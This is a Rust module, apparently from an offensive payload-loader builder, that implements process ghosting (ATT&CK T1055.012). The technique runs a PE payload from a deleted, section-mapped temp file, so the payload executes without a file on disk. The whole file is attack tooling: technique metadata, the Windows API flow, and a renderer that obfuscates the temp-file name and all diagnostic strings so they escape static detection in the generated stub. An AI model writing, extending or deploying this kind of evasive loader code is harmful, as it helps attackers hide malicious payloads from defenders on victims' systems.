//! Process ghosting.
//!
//! Runs the payload as a delete-on-close file mapped through a section, so the
//! image executes with no backing file on disk: the file's name disappears the
//! moment its handle closes, but the section keeps the bytes alive. See
//! `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for process ghosting: which payload to run (the payload format
/// lives in the payload's `build.payloads` entry).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Params {
    /// Name of the payload in `build.payloads` to run. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,
}

impl Default for Params {
    /// Ghosting has no per-step configuration: the only parameter is the
    /// payload to run, which is optional when exactly one payload is declared.
    fn default() -> Self {
        Self { payload: None }
    }
}

/// Static metadata for process ghosting.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "process_ghosting",
    attck: &["T1055.012"],
    // The image-section design runs the payload end to end (marker file + exit
    // code, x64). `Experimental` rather than `Stable`: only the x64 path has
    // been measured, and the payload's TLS callbacks and exception directories
    // are not exercised (README).
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &[],
    category: Category::Execution,
    doc_path: "src/techniques/process_ghosting/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[super::PayloadFormat::Pe],
    requires_indirect_syscalls: false,
    params_example: "technique: process_ghosting\n",
    readme: include_str!("README.md"),
    // The file -> section -> map flow is `CreateFileW`,
    // `SetFileInformationByHandle`, `NtCreateSection(SEC_IMAGE)` and
    // `NtMapViewOfSection`: two ntdll exports called directly (through the
    // windows-rs WDK bindings), not helpers of the indirect syscall layer, so
    // nothing is added there and `mode: none`/`indirect` render the same
    // fragment.
    syscalls: &[],
    // The payload's imports must be resolved and written into its IAT before it
    // runs: an image section maps the image and applies its relocations, but the
    // kernel does not resolve import names.
    resolves_imports: true,
};

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment_for` replaces each placeholder with code that rebuilds the
/// message at runtime, so no diagnostic text reaches the generated stub's
/// `.rdata`. Messages that interpolate a value keep a keyword-free `format!`
/// literal at the call site and take the label from here.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_WRITE_FAILED$",
        "could not write the payload to a temp file",
    ),
    ("$MSG_OPEN_FAILED$", "could not reopen the temp file"),
    (
        "$MSG_DISPOSITION_FAILED$",
        "could not mark the temp file for deletion",
    ),
    (
        "$MSG_SECTION_FAILED$",
        "could not create an image section over the temp file",
    ),
    (
        "$MSG_MAP_FAILED$",
        "could not map the image section into this process",
    ),
    ("$MSG_FILE_TOO_SMALL$", "payload too small to be a PE"),
    ("$MSG_BAD_DOS$", "invalid DOS header (missing MZ signature)"),
    ("$MSG_BAD_NT$", "invalid NT header (missing PE signature)"),
    ("$MSG_BAD_ARCH$", "unsupported architecture"),
    (
        "$MSG_HEADERS_OUT_OF_BOUNDS$",
        "the payload's headers do not fit in its image",
    ),
    (
        "$MSG_IMAGE_SIZE_INVALID$",
        "the payload's SizeOfImage does not match the mapped image",
    ),
    (
        "$MSG_ENTRY_OUT_OF_BOUNDS$",
        "the payload's entry point is outside its image",
    ),
    ("$MSG_NO_ENTRY$", "the payload declares no entry point"),
];

impl Params {
    /// Renders the process-ghosting stub fragment for these parameters.
    ///
    /// The temp-file stem and every diagnostic are substituted with code that
    /// rebuilds the value at runtime, so neither appears in the generated stub
    /// in cleartext. Ghosting is `format: pe` only (enforced by
    /// `plan::validate`), so `format` and `export` are ignored here.
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        _format: PayloadFormat,
        _export: Option<&str>,
    ) -> String {
        let temp_stem = strings.obfuscate("picaro").render_stub_expr("temp_stem");
        let mut rendered = DEF.stub_fragment.replace("$TEMP_STEM_DEF$", &temp_stem);
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("msg_{index}")),
            );
        }
        rendered
    }
}

#[cfg(test)]
mod tests;
